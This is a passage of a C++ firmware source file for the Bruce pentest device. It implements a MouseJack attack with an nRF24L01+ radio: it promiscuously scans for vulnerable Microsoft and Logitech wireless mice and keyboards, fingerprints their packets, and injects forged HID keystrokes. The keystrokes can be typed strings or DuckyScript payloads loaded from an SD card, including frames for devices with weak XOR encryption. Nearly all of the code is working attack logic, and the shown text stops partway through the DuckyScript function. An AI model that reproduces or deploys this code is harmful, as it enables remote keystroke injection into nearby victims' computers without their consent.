/**
 * @file nrf_mousejack.cpp
 * @brief MouseJack scan, fingerprint, and HID injection for Bruce firmware.
 *
 * Scans for vulnerable Microsoft and Logitech wireless mice/keyboards
 * using promiscuous nRF24L01+ reception, then injects HID keystrokes
 * via the same RF link.
 *
 * Credits: Based on uC_mousejack / Bastille Research / EvilMouse,
 *          adapted for Bruce architecture with multi-platform input.
 */

#include "nrf_mousejack.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/sd_functions.h"
#include <SD.h>
#include <globals.h>

// ── Tuning Constants ────────────────────────────────────────────
static constexpr int SCAN_TRIES_PER_CH = 6;
static constexpr int SCAN_DWELL_US = 500;
static constexpr int ATTACK_RETRANSMITS = 5;
static constexpr int ATTACK_INTER_KEY_MS = 10;

// ── Static module state ─────────────────────────────────────────
static MjTarget mj_targets[MJ_MAX_TARGETS];
static uint8_t mj_targetCount = 0;
static uint16_t mj_msSequence = 0;
static NRF24_MODE mj_nrfMode = NRF_MODE_SPI;

// ── ASCII to HID scancode lookup table ──────────────────────────
// Maps ASCII 0x20-0x7E to {modifier, keycode}
// Characters requiring SHIFT have MJ_MOD_LSHIFT set
static const MjHidKey ASCII_TO_HID[] = {
    // 0x20 SPACE
    {MJ_MOD_NONE,   MJ_KEY_SPACE    },
    // 0x21 !
    {MJ_MOD_LSHIFT, MJ_KEY_1        },
    // 0x22 "
    {MJ_MOD_LSHIFT, MJ_KEY_QUOTE    },
    // 0x23 #
    {MJ_MOD_LSHIFT, MJ_KEY_3        },
    // 0x24 $
    {MJ_MOD_LSHIFT, MJ_KEY_4        },
    // 0x25 %
    {MJ_MOD_LSHIFT, MJ_KEY_5        },
    // 0x26 &
    {MJ_MOD_LSHIFT, MJ_KEY_7        },
    // 0x27 '
    {MJ_MOD_NONE,   MJ_KEY_QUOTE    },
    // 0x28 (
    {MJ_MOD_LSHIFT, MJ_KEY_9        },
    // 0x29 )
    {MJ_MOD_LSHIFT, MJ_KEY_0        },
    // 0x2A *
    {MJ_MOD_LSHIFT, MJ_KEY_8        },
    // 0x2B +
    {MJ_MOD_LSHIFT, MJ_KEY_EQUAL    },
    // 0x2C ,
    {MJ_MOD_NONE,   MJ_KEY_COMMA    },
    // 0x2D -
    {MJ_MOD_NONE,   MJ_KEY_MINUS    },
    // 0x2E .
    {MJ_MOD_NONE,   MJ_KEY_DOT      },
    // 0x2F /
    {MJ_MOD_NONE,   MJ_KEY_SLASH    },
    // 0x30-0x39: 0-9
    {MJ_MOD_NONE,   MJ_KEY_0        }, // 0
    {MJ_MOD_NONE,   MJ_KEY_1        }, // 1
    {MJ_MOD_NONE,   0x1F            }, // 2
    {MJ_MOD_NONE,   0x20            }, // 3
    {MJ_MOD_NONE,   0x21            }, // 4
    {MJ_MOD_NONE,   0x22            }, // 5
    {MJ_MOD_NONE,   0x23            }, // 6
    {MJ_MOD_NONE,   MJ_KEY_7        }, // 7 = 0x24
    {MJ_MOD_NONE,   0x25            }, // 8
    {MJ_MOD_NONE,   0x26            }, // 9
    // 0x3A :
    {MJ_MOD_LSHIFT, MJ_KEY_SEMICOLON},
    // 0x3B ;
    {MJ_MOD_NONE,   MJ_KEY_SEMICOLON},
    // 0x3C <
    {MJ_MOD_LSHIFT, MJ_KEY_COMMA    },
    // 0x3D =
    {MJ_MOD_NONE,   MJ_KEY_EQUAL    },
    // 0x3E >
    {MJ_MOD_LSHIFT, MJ_KEY_DOT      },
    // 0x3F ?
    {MJ_MOD_LSHIFT, MJ_KEY_SLASH    },
    // 0x40 @
    {MJ_MOD_LSHIFT, 0x1F            }, // SHIFT+2
    // 0x41-0x5A: A-Z (uppercase = SHIFT + a-z)
    {MJ_MOD_LSHIFT, MJ_KEY_A        }, // A
    {MJ_MOD_LSHIFT, MJ_KEY_A + 1    }, // B
    {MJ_MOD_LSHIFT, MJ_KEY_A + 2    }, // C
    {MJ_MOD_LSHIFT, MJ_KEY_A + 3    }, // D
    {MJ_MOD_LSHIFT, MJ_KEY_A + 4    }, // E
    {MJ_MOD_LSHIFT, MJ_KEY_A + 5    }, // F
    {MJ_MOD_LSHIFT, MJ_KEY_A + 6    }, // G
    {MJ_MOD_LSHIFT, MJ_KEY_A + 7    }, // H
    {MJ_MOD_LSHIFT, MJ_KEY_A + 8    }, // I
    {MJ_MOD_LSHIFT, MJ_KEY_A + 9    }, // J
    {MJ_MOD_LSHIFT, MJ_KEY_A + 10   }, // K
    {MJ_MOD_LSHIFT, MJ_KEY_A + 11   }, // L
    {MJ_MOD_LSHIFT, MJ_KEY_A + 12   }, // M
    {MJ_MOD_LSHIFT, MJ_KEY_A + 13   }, // N
    {MJ_MOD_LSHIFT, MJ_KEY_A + 14   }, // O
    {MJ_MOD_LSHIFT, MJ_KEY_A + 15   }, // P
    {MJ_MOD_LSHIFT, MJ_KEY_A + 16   }, // Q
    {MJ_MOD_LSHIFT, MJ_KEY_A + 17   }, // R
    {MJ_MOD_LSHIFT, MJ_KEY_A + 18   }, // S
    {MJ_MOD_LSHIFT, MJ_KEY_A + 19   }, // T
    {MJ_MOD_LSHIFT, MJ_KEY_A + 20   }, // U
    {MJ_MOD_LSHIFT, MJ_KEY_A + 21   }, // V
    {MJ_MOD_LSHIFT, MJ_KEY_A + 22   }, // W
    {MJ_MOD_LSHIFT, MJ_KEY_A + 23   }, // X
    {MJ_MOD_LSHIFT, MJ_KEY_A + 24   }, // Y
    {MJ_MOD_LSHIFT, MJ_KEY_A + 25   }, // Z
    // 0x5B [
    {MJ_MOD_NONE,   MJ_KEY_LBRACKET },
    // 0x5C backslash
    {MJ_MOD_NONE,   MJ_KEY_BACKSLASH},
    // 0x5D ]
    {MJ_MOD_NONE,   MJ_KEY_RBRACKET },
    // 0x5E ^
    {MJ_MOD_LSHIFT, MJ_KEY_6        }, // SHIFT+6 = 0x23
    // 0x5F _
    {MJ_MOD_LSHIFT, MJ_KEY_MINUS    },
    // 0x60 `
    {MJ_MOD_NONE,   MJ_KEY_GRAVE    },
    // 0x61-0x7A: a-z (lowercase)
    {MJ_MOD_NONE,   MJ_KEY_A        }, // a
    {MJ_MOD_NONE,   MJ_KEY_A + 1    }, // b
    {MJ_MOD_NONE,   MJ_KEY_A + 2    }, // c
    {MJ_MOD_NONE,   MJ_KEY_A + 3    }, // d
    {MJ_MOD_NONE,   MJ_KEY_A + 4    }, // e
    {MJ_MOD_NONE,   MJ_KEY_A + 5    }, // f
    {MJ_MOD_NONE,   MJ_KEY_A + 6    }, // g
    {MJ_MOD_NONE,   MJ_KEY_A + 7    }, // h
    {MJ_MOD_NONE,   MJ_KEY_A + 8    }, // i
    {MJ_MOD_NONE,   MJ_KEY_A + 9    }, // j
    {MJ_MOD_NONE,   MJ_KEY_A + 10   }, // k
    {MJ_MOD_NONE,   MJ_KEY_A + 11   }, // l
    {MJ_MOD_NONE,   MJ_KEY_A + 12   }, // m
    {MJ_MOD_NONE,   MJ_KEY_A + 13   }, // n
    {MJ_MOD_NONE,   MJ_KEY_A + 14   }, // o
    {MJ_MOD_NONE,   MJ_KEY_A + 15   }, // p
    {MJ_MOD_NONE,   MJ_KEY_A + 16   }, // q
    {MJ_MOD_NONE,   MJ_KEY_A + 17   }, // r
    {MJ_MOD_NONE,   MJ_KEY_A + 18   }, // s
    {MJ_MOD_NONE,   MJ_KEY_A + 19   }, // t
    {MJ_MOD_NONE,   MJ_KEY_A + 20   }, // u
    {MJ_MOD_NONE,   MJ_KEY_A + 21   }, // v
    {MJ_MOD_NONE,   MJ_KEY_A + 22   }, // w
    {MJ_MOD_NONE,   MJ_KEY_A + 23   }, // x
    {MJ_MOD_NONE,   MJ_KEY_A + 24   }, // y
    {MJ_MOD_NONE,   MJ_KEY_A + 25   }, // z
    // 0x7B {
    {MJ_MOD_LSHIFT, MJ_KEY_LBRACKET },
    // 0x7C |
    {MJ_MOD_LSHIFT, MJ_KEY_BACKSLASH},
    // 0x7D }
    {MJ_MOD_LSHIFT, MJ_KEY_RBRACKET },
    // 0x7E ~
    {MJ_MOD_LSHIFT, MJ_KEY_GRAVE    },
};

// ── DuckyScript key name table ──────────────────────────────────
static const MjDuckyKey DUCKY_KEYS[] = {
    {"ENTER",       MJ_MOD_NONE,   MJ_KEY_ENTER     },
    {"RETURN",      MJ_MOD_NONE,   MJ_KEY_ENTER     },
    {"ESCAPE",      MJ_MOD_NONE,   MJ_KEY_ESC       },
    {"ESC",         MJ_MOD_NONE,   MJ_KEY_ESC       },
    {"BACKSPACE",   MJ_MOD_NONE,   MJ_KEY_BACKSPACE },
    {"TAB",         MJ_MOD_NONE,   MJ_KEY_TAB       },
    {"SPACE",       MJ_MOD_NONE,   MJ_KEY_SPACE     },
    {"CAPSLOCK",    MJ_MOD_NONE,   MJ_KEY_CAPSLOCK  },
    {"DELETE",      MJ_MOD_NONE,   MJ_KEY_DELETE    },
    {"INSERT",      MJ_MOD_NONE,   MJ_KEY_INSERT    },
    {"HOME",        MJ_MOD_NONE,   MJ_KEY_HOME      },
    {"END",         MJ_MOD_NONE,   MJ_KEY_END       },
    {"PAGEUP",      MJ_MOD_NONE,   MJ_KEY_PAGEUP    },
    {"PAGEDOWN",    MJ_MOD_NONE,   MJ_KEY_PAGEDOWN  },
    {"UP",          MJ_MOD_NONE,   MJ_KEY_UP        },
    {"UPARROW",     MJ_MOD_NONE,   MJ_KEY_UP        },
    {"DOWN",        MJ_MOD_NONE,   MJ_KEY_DOWN      },
    {"DOWNARROW",   MJ_MOD_NONE,   MJ_KEY_DOWN      },
    {"LEFT",        MJ_MOD_NONE,   MJ_KEY_LEFT      },
    {"LEFTARROW",   MJ_MOD_NONE,   MJ_KEY_LEFT      },
    {"RIGHT",       MJ_MOD_NONE,   MJ_KEY_RIGHT     },
    {"RIGHTARROW",  MJ_MOD_NONE,   MJ_KEY_RIGHT     },
    {"PRINTSCREEN", MJ_MOD_NONE,   MJ_KEY_PRINTSCR  },
    {"SCROLLLOCK",  MJ_MOD_NONE,   MJ_KEY_SCROLLLOCK},
    {"PAUSE",       MJ_MOD_NONE,   MJ_KEY_PAUSE     },
    {"BREAK",       MJ_MOD_NONE,   MJ_KEY_PAUSE     },
    {"F1",          MJ_MOD_NONE,   MJ_KEY_F1        },
    {"F2",          MJ_MOD_NONE,   MJ_KEY_F1 + 1    },
    {"F3",          MJ_MOD_NONE,   MJ_KEY_F1 + 2    },
    {"F4",          MJ_MOD_NONE,   MJ_KEY_F1 + 3    },
    {"F5",          MJ_MOD_NONE,   MJ_KEY_F1 + 4    },
    {"F6",          MJ_MOD_NONE,   MJ_KEY_F1 + 5    },
    {"F7",          MJ_MOD_NONE,   MJ_KEY_F1 + 6    },
    {"F8",          MJ_MOD_NONE,   MJ_KEY_F1 + 7    },
    {"F9",          MJ_MOD_NONE,   MJ_KEY_F1 + 8    },
    {"F10",         MJ_MOD_NONE,   MJ_KEY_F1 + 9    },
    {"F11",         MJ_MOD_NONE,   MJ_KEY_F1 + 10   },
    {"F12",         MJ_MOD_NONE,   MJ_KEY_F12       },
    // Modifiers (keycode=NONE, only set modifier bits)
    {"CTRL",        MJ_MOD_LCTRL,  MJ_KEY_NONE      },
    {"CONTROL",     MJ_MOD_LCTRL,  MJ_KEY_NONE      },
    {"SHIFT",       MJ_MOD_LSHIFT, MJ_KEY_NONE      },
    {"ALT",         MJ_MOD_LALT,   MJ_KEY_NONE      },
    {"GUI",         MJ_MOD_LGUI,   MJ_KEY_NONE      },
    {"WINDOWS",     MJ_MOD_LGUI,   MJ_KEY_NONE      },
    {"COMMAND",     MJ_MOD_LGUI,   MJ_KEY_NONE      },
    {"MENU",        MJ_MOD_NONE,   0x65             }, // HID Usage: Keyboard Application
    {"APP",         MJ_MOD_NONE,   0x65             },
    {nullptr,       0,             0                }  // Sentinel
};

// ── Helper: ASCII to HID ────────────────────────────────────────
static bool mj_asciiToHid(char c, MjHidKey &out) {
    if (c < 0x20 || c > 0x7E) return false;
    out = ASCII_TO_HID[c - 0x20];
    return (out.keycode != MJ_KEY_NONE);
}

// ── CRC16-CCITT for ESB packet validation ───────────────────────
static uint16_t mj_crcUpdate(uint16_t crc, uint8_t byte, uint8_t bits) {
    crc = crc ^ ((uint16_t)byte << 8);
    while (bits--) {
        if ((crc & 0x8000) == 0x8000) crc = (crc << 1) ^ 0x1021;
        else crc = crc << 1;
    }
    return crc & 0xFFFF;
}

// ── Target Management ───────────────────────────────────────────
static int mj_findTarget(const uint8_t *addr, uint8_t addrLen) {
    for (uint8_t i = 0; i < mj_targetCount; i++) {
        if (mj_targets[i].active && mj_targets[i].addrLen == addrLen &&
            memcmp(mj_targets[i].address, addr, addrLen) == 0) {
            return i;
        }
    }
    return -1;
}

static int mj_addTarget(const uint8_t *addr, uint8_t addrLen, uint8_t channel, MjDeviceType type) {
    int idx = mj_findTarget(addr, addrLen);
    if (idx >= 0) {
        mj_targets[idx].channel = channel;
        return idx;
    }
    if (mj_targetCount >= MJ_MAX_TARGETS) return -1;

    idx = mj_targetCount++;
    memcpy(mj_targets[idx].address, addr, addrLen);
    mj_targets[idx].addrLen = addrLen;
    mj_targets[idx].channel = channel;
    mj_targets[idx].type = type;
    mj_targets[idx].active = true;

    Serial.printf(
        "[MJ] Target #%d: type=%d ch=%d addr=%02X:%02X:%02X:%02X:%02X\n",
        idx,
        type,
        channel,
        addr[0],
        addr[1],
        addrLen > 2 ? addr[2] : 0,
        addrLen > 3 ? addr[3] : 0,
        addrLen > 4 ? addr[4] : 0
    );
    return idx;
}

static bool mj_validateNrfMode() {
    if (!CHECK_NRF_SPI(mj_nrfMode)) {
        displayError("MouseJack needs SPI mode", true);
        return false;
    }
    return true;
}

// ── Fingerprinting ──────────────────────────────────────────────
static void
mj_fingerprintPayload(const uint8_t *payload, uint8_t size, const uint8_t *addr, uint8_t channel) {
    // Microsoft Mouse detection:
    // size==19 && payload[0]==0x08 && payload[6]==0x40 → unencrypted
    // size==19 && payload[0]==0x0A → encrypted
    if (size == 19) {
        if (payload[0] == 0x08 && payload[6] == 0x40) {
            mj_addTarget(addr, 5, channel, MJ_DEVICE_MICROSOFT);
            return;
        }
        if (payload[0] == 0x0A) {
            mj_addTarget(addr, 5, channel, MJ_DEVICE_MS_CRYPT);
            return;
        }
    }

    // Logitech detection (first byte is always 0x00):
    //   size==10 && payload[1]==0xC2 → keepalive
    //   size==10 && payload[1]==0x4F → mouse movement
    //   size==22 && payload[1]==0xD3 → encrypted keystroke
    //   size==5  && payload[1]==0x40 → wake-up
    if (payload[0] == 0x00) {
        bool isLogitech = false;
        if (size == 10 && (payload[1] == 0xC2 || payload[1] == 0x4F)) isLogitech = true;
        if (size == 22 && payload[1] == 0xD3) isLogitech = true;
        if (size == 5 && payload[1] == 0x40) isLogitech = true;
        if (isLogitech) {
            mj_addTarget(addr, 5, channel, MJ_DEVICE_LOGITECH);
            return;
        }
    }
}

static void mj_fingerprint(const uint8_t *rawBuf, uint8_t size, uint8_t channel) {
    if (size < 10) return;

    uint8_t buf[37];
    if (size > 37) size = 37;
    memcpy(buf, rawBuf, size);

    // Try both raw buffer and 1-bit right-shifted version
    // (handles both 0xAA and 0x55 preamble alignments)
    for (int offset = 0; offset < 2; offset++) {
        if (offset == 1) {
            memcpy(buf, rawBuf, size);
            for (int x = size - 1; x >= 0; x--) {
                if (x > 0) buf[x] = (buf[x - 1] << 7) | (buf[x] >> 1);
                else buf[x] = buf[x] >> 1;
            }
        }

        // Read payload length from PCF (upper 6 bits of byte [5])
        uint8_t payloadLength = buf[5] >> 2;

        if (payloadLength == 0 || payloadLength > (size - 9)) continue;

        // Extract and verify CRC16-CCITT
        uint16_t crcGiven = ((uint16_t)buf[6 + payloadLength] << 9) | ((uint16_t)buf[7 + payloadLength] << 1);
        crcGiven = (crcGiven << 8) | (crcGiven >> 8);
        if (buf[8 + payloadLength] & 0x80) crcGiven |= 0x0100;

        uint16_t crcCalc = 0xFFFF;
        for (int x = 0; x < 6 + payloadLength; x++) { crcCalc = mj_crcUpdate(crcCalc, buf[x], 8); }
        crcCalc = mj_crcUpdate(crcCalc, buf[6 + payloadLength] & 0x80, 1);
        crcCalc = (crcCalc << 8) | (crcCalc >> 8);

        if (crcCalc != crcGiven) continue;

        // CRC verified! Extract address and payload
        uint8_t addr[5];
        memcpy(addr, buf, 5);

        uint8_t esbPayload[32];
        for (int x = 0; x < payloadLength; x++) {
            esbPayload[x] = ((buf[6 + x] << 1) & 0xFF) | (buf[7 + x] >> 7);
        }

        mj_fingerprintPayload(esbPayload, payloadLength, addr, channel);
        return;
    }
}

// ── Microsoft Protocol Helpers ──────────────────────────────────
static void mj_msChecksum(uint8_t *payload, uint8_t size) {
    uint8_t checksum = 0;
    for (uint8_t i = 0; i < size - 1; i++) checksum ^= payload[i];
    payload[size - 1] = ~checksum;
}

static void mj_msCrypt(uint8_t *payload, uint8_t size, const uint8_t *addr) {
    for (uint8_t i = 4; i < size; i++) { payload[i] ^= addr[((i - 4) % 5)]; }
}

// ── Transmit with retransmission ────────────────────────────────
static void mj_transmitReliable(const uint8_t *frame, uint8_t len) {
    for (int r = 0; r < ATTACK_RETRANSMITS; r++) {
        NRFradio.write(frame, len, true); // multicast = no ACK wait
    }
}

static void mj_logTransmit(const MjTarget &target, uint8_t meta, const uint8_t *keys, uint8_t keysLen);

static void mj_logitechWake(const MjTarget &target) {
    if (target.type != MJ_DEVICE_LOGITECH) return;

    // Common Logitech wake/sleep-timer packet seen in MouseJack tooling
    uint8_t hello[10] = {0x00, 0x4F, 0x00, 0x04, 0xB0, 0x10, 0x00, 0x00, 0x00, 0xED};
    mj_transmitReliable(hello, sizeof(hello));
    delay(12);

    // Neutral keepalive frame after wake-up
    uint8_t neutral = MJ_KEY_NONE;
    mj_logTransmit(target, MJ_MOD_NONE, &neutral, 1);
    delay(8);
}

// ── Microsoft Keystroke Transmit ────────────────────────────────
static void mj_msTransmit(const MjTarget &target, uint8_t meta, uint8_t hid) {
    uint8_t frame[19];
    memset(frame, 0, sizeof(frame));

    frame[0] = 0x08;
    frame[4] = (uint8_t)(mj_msSequence & 0xFF);
    frame[5] = (uint8_t)((mj_msSequence >> 8) & 0xFF);
    frame[6] = 0x43;
    frame[7] = meta;
    frame[9] = hid;
    mj_msSequence++;
    mj_msChecksum(frame, sizeof(frame));
    if (target.type == MJ_DEVICE_MS_CRYPT) { mj_msCrypt(frame, sizeof(frame), target.address); }

    // Key-down
    mj_transmitReliable(frame, sizeof(frame));
    delay(5);

    // Key-up (null keystroke)
    if (target.type == MJ_DEVICE_MS_CRYPT) { mj_msCrypt(frame, sizeof(frame), target.address); }
    for (int n = 4; n < 18; n++) frame[n] = 0;
    frame[4] = (uint8_t)(mj_msSequence & 0xFF);
    frame[5] = (uint8_t)((mj_msSequence >> 8) & 0xFF);
    frame[6] = 0x43;
    mj_msSequence++;
    mj_msChecksum(frame, sizeof(frame));
    if (target.type == MJ_DEVICE_MS_CRYPT) { mj_msCrypt(frame, sizeof(frame), target.address); }

    mj_transmitReliable(frame, sizeof(frame));
    delay(5);
}

// ── Logitech Keystroke Transmit ─────────────────────────────────
static void mj_logTransmit(const MjTarget &target, uint8_t meta, const uint8_t *keys, uint8_t keysLen) {
    uint8_t frame[10];
    memset(frame, 0, sizeof(frame));

    frame[0] = 0x00;
    frame[1] = 0xC1;
    frame[2] = meta;
    for (uint8_t i = 0; i < keysLen && i < 6; i++) { frame[3 + i] = keys[i]; }

    // Two's-complement checksum
    uint8_t cksum = 0;
    for (uint8_t i = 0; i < 9; i++) cksum += frame[i];
    frame[9] = (uint8_t)(0x100 - cksum);

    mj_transmitReliable(frame, sizeof(frame));
}

// ── Send single keystroke (press + release) ─────────────────────
static void mj_sendKeystroke(const MjTarget &target, uint8_t modifier, uint8_t keycode) {
    if (target.type == MJ_DEVICE_MICROSOFT || target.type == MJ_DEVICE_MS_CRYPT) {
        mj_msTransmit(target, modifier, keycode);
    } else if (target.type == MJ_DEVICE_LOGITECH) {
        mj_logTransmit(target, modifier, &keycode, 1);
        delay(ATTACK_INTER_KEY_MS);
        uint8_t none = MJ_KEY_NONE;
        mj_logTransmit(target, MJ_MOD_NONE, &none, 1);
    }
}

// ── Type a string as keystrokes ─────────────────────────────────
static void mj_typeString(const MjTarget &target, const char *text) {
    for (size_t i = 0; text[i] != '\0'; i++) {
        if (check(EscPress)) return;

        MjHidKey entry;
        char c = text[i];
        if (c == '\n') {
            entry.modifier = MJ_MOD_NONE;
            entry.keycode = MJ_KEY_ENTER;
        } else if (c == '\t') {
            entry.modifier = MJ_MOD_NONE;
            entry.keycode = MJ_KEY_TAB;
        } else if (!mj_asciiToHid(c, entry)) {
            continue;
        }
        mj_sendKeystroke(target, entry.modifier, entry.keycode);
        delay(ATTACK_INTER_KEY_MS);
    }
}

// ── DuckyScript line parser ─────────────────────────────────────
static bool mj_parseDuckyLine(const String &line, const MjTarget &target) {
    if (line.startsWith("REM") || line.startsWith("//")) return true;

    if (line.startsWith("DELAY ") || line.startsWith("DELAY\t")) {
        int delayMs = line.substring(6).toInt();
        if (delayMs > 0 && delayMs <= 60000) delay(delayMs);
        return true;
    }

    if (line.startsWith("DEFAULT_DELAY ") || line.startsWith("DEFAULTDELAY ")) {
        return true; // Handled by caller
    }

    if (line.startsWith("STRING ")) {
        mj_typeString(target, line.substring(7).c_str());
        return true;
    }

    if (line.startsWith("STRINGLN ")) {
        mj_typeString(target, line.substring(9).c_str());
        mj_sendKeystroke(target, MJ_MOD_NONE, MJ_KEY_ENTER);
        return true;
    }

    if (line.startsWith("REPEAT ")) return true;

    // Handle key names and modifier combos
    uint8_t combinedMod = 0;
    uint8_t keycode = MJ_KEY_NONE;
    String remaining = line;
    remaining.trim();

    while (remaining.length() > 0) {
        int spaceIdx = remaining.indexOf(' ');
        String token;
        if (spaceIdx > 0) {
            token = remaining.substring(0, spaceIdx);
            remaining = remaining.substring(spaceIdx + 1);
            remaining.trim();
        } else {
            token = remaining;
            remaining = "";
        }

        // Single character key
        if (token.length() == 1) {
            MjHidKey entry;
            if (mj_asciiToHid(token.charAt(0), entry)) {
                combinedMod |= entry.modifier;
                keycode = entry.keycode;
            }
            continue;
        }

        // Named key/modifier lookup
        bool found = false;
        for (int i = 0; DUCKY_KEYS[i].name != nullptr; i++) {
            if (token.equalsIgnoreCase(DUCKY_KEYS[i].name)) {
                combinedMod |= DUCKY_KEYS[i].modifier;
                if (DUCKY_KEYS[i].keycode != MJ_KEY_NONE) { keycode = DUCKY_KEYS[i].keycode; }
                found = true;
                break;
            }
        }
        if (!found) {
            Serial.printf("[MJ] Ducky: unknown token '%s'\n", token.c_str());
            return false;
        }
    }

    mj_sendKeystroke(target, combinedMod, keycode);
    delay(ATTACK_INTER_KEY_MS);
    return true;
}

// ── Get device type label ───────────────────────────────────────
static const char *mj_getTypeLabel(MjDeviceType type) {
    switch (type) {
        case MJ_DEVICE_MICROSOFT: return "MS";
        case MJ_DEVICE_MS_CRYPT: return "MS*";
        case MJ_DEVICE_LOGITECH: return "LG";
        default: return "??";
    }
}

// ── Format address as string ────────────────────────────────────
static String mj_formatAddr(const MjTarget &t) {
    char buf[18];
    if (t.addrLen >= 5) {
        snprintf(
            buf,
            sizeof(buf),
            "%02X:%02X:%02X:%02X:%02X",
            t.address[0],
            t.address[1],
            t.address[2],
            t.address[3],
            t.address[4]
        );
    } else {
        snprintf(buf, sizeof(buf), "%02X:%02X", t.address[0], t.address[1]);
    }
    return String(buf);
}

// ══════════════════════════════════════════════════════════════════
// ═══════════════ SCANNING UI ═══════════════════════════════════
// ══════════════════════════════════════════════════════════════════

static void mj_drawScanScreen(uint8_t currentCh, bool initial) {
    int contentY = BORDER_PAD_Y + FM * LH + 4; // Below title
    int footerH = FP * LH + 4;
    int listY = contentY + 14; // Below status line
    int listH = tftHeight - listY - footerH - 6;

    if (initial) { drawMainBorderWithTitle("MOUSEJACK SCAN"); }

    // Status line (below title, inside border)
    tft.setTextSize(FP);
    tft.fillRect(7, contentY, tftWidth - 14, 12, bruceConfig.bgColor);
    tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
    char statusBuf[40];
    snprintf(statusBuf, sizeof(statusBuf), "CH:%3d  Targets:%d", currentCh, mj_targetCount);
    tft.drawCentreString(statusBuf, tftWidth / 2, contentY, 1);

    // Target list
    int maxItems = listH / 12;
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    for (int i = 0; i < maxItems && i < mj_targetCount; i++) {
        int y = listY + i * 12;
        tft.fillRect(7, y, tftWidth - 14, 12, bruceConfig.bgColor);
        char line[40];
        snprintf(
            line,
            sizeof(line),
            "[%s] %s ch%d",
            mj_getTypeLabel(mj_targets[i].type),
            mj_formatAddr(mj_targets[i]).c_str(),
            mj_targets[i].channel
        );
        tft.drawString(line, 12, y, 1);
    }

    // Footer (inside border)
    int footerY = tftHeight - BORDER_PAD_X - FP * LH - 2;
    tft.fillRect(7, footerY, tftWidth - 14, FP * LH, bruceConfig.bgColor);
    tft.setTextColor(TFT_DARKGREY, bruceConfig.bgColor);
    tft.drawCentreString("[ESC] Stop", tftWidth / 2, footerY, 1);
}

// ── Scanning function ───────────────────────────────────────────
static bool mj_scan() {
    mj_targetCount = 0;
    memset(mj_targets, 0, sizeof(mj_targets));

    if (!mj_validateNrfMode()) return false;

    if (!nrf_start(mj_nrfMode)) {
        displayError("NRF24 not found", true);
        return false;
    }

    // Configure promiscuous mode
    NRFradio.setAutoAck(false);
    NRFradio.disableCRC();
    NRFradio.setAddressWidth(2);
    NRFradio.setDataRate(RF24_2MBPS);
    NRFradio.setPayloadSize(32);
    NRFradio.setRetries(0, 0);
    NRFradio.flush_rx();
    NRFradio.flush_tx();

    const uint8_t noiseAddress[][2] = {
        {0x55, 0x55},
        {0xAA, 0xAA},
        {0xA0, 0xAA},
        {0xAB, 0xAA},
        {0xAC, 0xAA},
        {0xAD, 0xAA}
    };
    for (uint8_t i = 0; i < 6; i++) { NRFradio.openReadingPipe(i, noiseAddress[i]); }

    mj_drawScanScreen(0, true);

    uint8_t lastDrawnCount = 0;
    unsigned long lastRefresh = 0;
    bool scanning = true;

    while (scanning) {
        // Sweep channels 2-84 (ESB range)
        for (uint8_t ch = 2; ch <= 84 && scanning; ch++) {
            if (check(EscPress)) {
                scanning = false;
                break;
            }

            NRFradio.setChannel(ch);
            NRFradio.startListening();

            for (int tries = 0; tries < SCAN_TRIES_PER_CH; tries++) {
                delayMicroseconds(SCAN_DWELL_US);

                if (NRFradio.available()) {
                    uint8_t rxBuf[32];
                    NRFradio.read(rxBuf, sizeof(rxBuf));
                    mj_fingerprint(rxBuf, 32, ch);
                }
            }

            NRFradio.stopListening();

            // Refresh display periodically
            if (millis() - lastRefresh > 200 || mj_targetCount != lastDrawnCount) {
                mj_drawScanScreen(ch, false);
                lastDrawnCount = mj_targetCount;
                lastRefresh = millis();
            }
        }
    }

    NRFradio.stopListening();
    NRFradio.powerDown();
    return (mj_targetCount > 0);
}

// ══════════════════════════════════════════════════════════════════
// ═══════════════ ATTACK EXECUTION ══════════════════════════════
// ══════════════════════════════════════════════════════════════════

static void mj_setupTxForTarget(const MjTarget &target) {
    NRFradio.stopListening();
    NRFradio.setAutoAck(false);
    NRFradio.setDataRate(RF24_2MBPS);
    NRFradio.setPALevel(RF24_PA_MAX);
    NRFradio.setAddressWidth(5);
    NRFradio.setChannel(target.channel);
    NRFradio.setRetries(0, 0);
    NRFradio.flush_rx();
    NRFradio.flush_tx();

    uint8_t addr[5];
    memcpy(addr, target.address, 5);
    NRFradio.openWritingPipe(addr);

    // Set payload size based on device type
    if (target.type == MJ_DEVICE_MICROSOFT || target.type == MJ_DEVICE_MS_CRYPT) {
        NRFradio.setPayloadSize(19);
    } else {
        NRFradio.setPayloadSize(10);
    }
}

// ── Attack: Inject String ───────────────────────────────────────
static void mj_attackString(int targetIndex) {
    const MjTarget &target = mj_targets[targetIndex];

    // Get string from user via keyboard
    String text = keyboard("", 200, "Inject text:");
    if (text.length() == 0) return;

    drawMainBorderWithTitle("INJECTING");
    tft.setTextSize(FP);
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    int cy = tftHeight * 0.35;
    tft.drawCentreString(
        "[" + String(mj_getTypeLabel(target.type)) + "] " + mj_formatAddr(target), tftWidth / 2, cy, 1
    );
    cy += 16;
    tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
    tft.drawCentreString("Sending keystrokes...", tftWidth / 2, cy, 1);
    cy += 16;

    // Show first 30 chars of the text
    String preview = text.substring(0, 30);
    if (text.length() > 30) preview += "...";
    tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
    tft.drawCentreString(preview, tftWidth / 2, cy, 1);

    if (!mj_validateNrfMode()) return;

    if (!nrf_start(mj_nrfMode)) {
        displayError("NRF24 not found", true);
        return;
    }

    mj_setupTxForTarget(target);
    mj_logitechWake(target);

    // Sync sequence for Microsoft
    if (target.type == MJ_DEVICE_MICROSOFT || target.type == MJ_DEVICE_MS_CRYPT) {
        mj_msSequence = 0;
        for (int i = 0; i < 6; i++) {
            mj_msTransmit(target, 0, 0);
            delay(2);
        }
    }

    mj_typeString(target, text.c_str());

    NRFradio.powerDown();
    displaySuccess("Injection complete", true);
}

// ── Attack: DuckyScript from SD Card ────────────────────────────
static void mj_attackDucky(int targetIndex) {
    const MjTarget &target = mj_targets[targetIndex];

    // File browser
    FS *fs = nullptr;
    if (!getFsStorage(fs)) {
        displayError("No storage found");
        delay(500);
        return;
    }
    String filepath = loopSD(*fs, true, ".txt");
    if (filepath.length() == 0) return;

    drawMainBorderWithTitle("DUCKYSCRIPT");
    tft.setTextSize(FP);
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    int cy = tftHeight * 0.35;
